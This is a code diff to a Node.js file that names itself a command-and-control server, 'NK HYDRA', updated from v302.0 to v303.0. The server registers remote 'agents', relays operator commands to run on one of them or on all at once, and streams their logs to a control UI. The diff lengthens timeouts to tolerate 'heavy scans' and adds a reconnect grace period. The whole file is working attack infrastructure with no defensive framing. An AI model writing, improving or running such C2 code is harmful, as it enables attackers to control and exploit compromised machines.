@@ -1,5 +1,5 @@
 // TYPE: NODE.JS C2 SERVER
-// NK HYDRA v302.0 [TITAN STABLE]
+// NK HYDRA v303.0 [TITAN STABLE]
 
 const express = require('express');
 const http = require('http');
@@ -9,21 +9,19 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v302.0', agents: agents.length }); });
+app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v303.0', agents: agents.length }); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingInterval: 10000, 
-    pingTimeout: 60000, // Generous timeout for slow scans
+    pingInterval: 25000, // Very lenient ping interval
+    pingTimeout: 120000, // 2 minutes timeout to tolerate heavy scans
     maxHttpBufferSize: 1e8 // 100MB buffer for logs
 });
 
 let agents = []; 
 
 io.on('connection', (socket) => {
-    // console.log('[+] New Connection:', socket.id);
-
     // Identify Phase
     socket.on('identify', (data) => {
         if (data.type === 'ui') {
@@ -50,7 +48,7 @@ io.on('connection', (socket) => {
     socket.on('exec_cmd', (data) => {
         console.log(`[>] CMD: ${data.cmd} -> ${data.targetId}`);
         if (data.targetId === 'all') {
-            socket.broadcast.emit('exec_cmd', data); // Broadcast to all agents
+            socket.broadcast.emit('exec_cmd', data); 
         } else {
             const agent = agents.find(a => a.id === data.targetId);
             if (agent) io.to(agent.socketId).emit('exec_cmd', data);
@@ -62,7 +60,7 @@ io.on('connection', (socket) => {
         // Relay Log immediately to UI
         io.to('ui_room').emit('agent_event', data);
         
-        // Update Agent Status on specific events
+        // Update Agent Status - Any activity keeps it alive
         if (data.agentId) {
              const agent = agents.find(a => a.id === data.agentId);
              if (agent) {
@@ -75,20 +73,19 @@ io.on('connection', (socket) => {
     socket.on('disconnect', () => {
         const agent = agents.find(a => a.socketId === socket.id);
         if (agent) { 
-            agent.status = 'Offline'; 
-            console.log(`[-] Agent Lost: ${agent.id}`);
-            io.to('ui_room').emit('agents_list', agents);
-        }
-    });
-    
-    socket.on('heartbeat', () => {
-        const agent = agents.find(a => a.socketId === socket.id);
-        if (agent) {
-            agent.lastSeen = Date.now();
-            agent.status = 'Online';
+            // Don't mark offline immediately. Wait for reconnect.
+            console.log(`[-] Socket Drop: ${agent.id}`);
+            setTimeout(() => {
+                // Check if agent reconnected with new socket
+                const stillHere = agents.find(a => a.id === agent.id && a.status === 'Online');
+                if (!stillHere) {
+                    agent.status = 'Offline'; 
+                    io.to('ui_room').emit('agents_list', agents);
+                }
+            }, 5000); // 5s grace period
         }
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v302.0 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v303.0 LISTENING ON ${PORT}`));
